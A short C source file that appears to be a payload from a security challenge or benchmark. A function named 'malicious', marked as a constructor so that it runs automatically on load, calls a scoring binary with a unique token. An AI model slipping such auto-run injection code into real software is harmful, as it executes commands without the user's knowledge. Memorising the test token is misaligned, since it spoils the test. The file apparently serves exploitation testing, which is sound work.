#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score a2ce960d-520e-4f79-bc92-b7fe5663e2ce");
}
